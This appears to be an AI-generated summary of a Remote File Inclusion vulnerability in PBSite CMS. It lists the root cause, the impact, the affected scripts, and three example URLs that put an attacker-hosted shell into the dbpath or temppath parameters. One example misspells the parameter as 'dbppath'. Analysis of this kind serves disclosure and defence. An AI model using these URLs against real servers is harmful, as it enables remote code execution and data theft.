Based on the provided information, here's a breakdown of the vulnerability:

**Root Cause:**

*   The vulnerability stems from a **Remote File Inclusion (RFI)** flaw present in the PBSite - PHP Bulletin Site CMS. This occurs because multiple PHP scripts within the CMS include files using variables that can be manipulated through user-supplied input. Specifically, the `dbpath` and `temppath` variables are vulnerable to this injection.

**Weaknesses/Vulnerabilities:**

*   **Unsanitized Input:** The application does not properly sanitize or validate user-supplied input for the `dbpath` and `temppath` parameters in the URL. This allows an attacker to inject malicious URLs or file paths.
*   **Insecure Inclusion:** The application uses `include()` or `include_once()` statements with variables directly taken from user input, making it vulnerable to file inclusion attacks.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a remote file containing malicious PHP code, an attacker can gain arbitrary code execution on the server, potentially leading to complete system compromise.
*   **Data Theft or Manipulation:** An attacker can potentially access, modify, or delete sensitive data stored within the application's database or file system by leveraging the code execution capabilities
*   **Denial of Service:** The attacker might cause a denial of service by including a file which has a resource intensive code, making the application unavailable.

**Attack Vectors:**

*   **HTTP GET Requests:** The vulnerability is exploited through HTTP GET requests, by providing the malicious URL as the value for the vulnerable parameters such as `dbpath` or `temppath` in the URL.
*   **Vulnerable parameters:** The identified vulnerable parameters are `dbpath` and `temppath`, which are present in various PHP scripts within the CMS.

**Required Attacker Capabilities/Position:**

*   **Remote Access:** The attacker can be remote since the attack vector is via HTTP GET requests.
*   **Basic Understanding of HTTP Requests:** The attacker must have a basic understanding of how to manipulate HTTP GET requests to include malicious URLs in the vulnerable parameters.

**Vulnerable Scripts:**

The following scripts are identified as vulnerable:

*   `useronline.php`
*   `ucp.php`
*   `setcookie.php`
*   `sendpm.php`
*   `search.php`
*   `register.php`
*   `profile.php`
*   `post.php`
*   `pmpshow.php`
*   `pm.php`
*   `ntopic.php`
*   `nreply.php`
*   `news.php`
*   `memberslist.php`
*   `logout.php`
*   `login.php`
*   `index.php`
*   `help.php`
*   `forum.php`
*   `error.php`
*   `editpost.php`
*   `delpost.php`
*   `delpm.php`
*   `confirm.php`
*   `board.php`
*   `admin2.php`
*   `admin.php`
*   `templates/pb/css/formstyles.php`

**Exploit Examples:**

The provided exploit examples show how an attacker can inject malicious URLs using the `dbpath` or `temppath` parameters:

*   `http://victim/path/useronline.php?dbpath=[shell]`
*   `http://victim/path/setcookie.php?temppath=[shell]`
*   `http://victim/path/index.php?dbppath=[shell]`

where `[shell]` would be replaced with a URL pointing to a malicious PHP script hosted by the attacker.
